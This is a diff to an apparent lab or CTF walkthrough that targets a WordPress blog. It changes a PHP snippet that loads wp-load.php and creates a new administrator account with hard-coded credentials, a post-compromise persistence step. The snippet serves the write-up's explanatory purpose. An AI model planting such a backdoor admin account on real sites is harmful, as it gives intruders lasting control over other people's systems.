@@ -141,17 +141,17 @@ Still on the machine as the user `thiago` with the "admin" role, we will create 
 define('WP_USE_THEMES', false);
 require_once('/var/www/synthlabs-blog/wp-load.php');
 
-$user = 'teste';
-$pass = 'Teste@123';
-$email = 'teste@gmail.com';
+$user = 'ribeirin';
+$pass = 'ribeirin@hc';
+$email = 'ribeirin@hc.com';
 
 if (!username_exists($user) && !email_exists($email)) {
     $user_id = wp_create_user($user, $pass, $email);
     $user = new WP_User($user_id);
     $user->set_role('administrator');
-    echo "User criado";
+    echo "User created";
 } else {
-    echo "Erro.";
+    echo "Error";
 }
 ?>
 ```
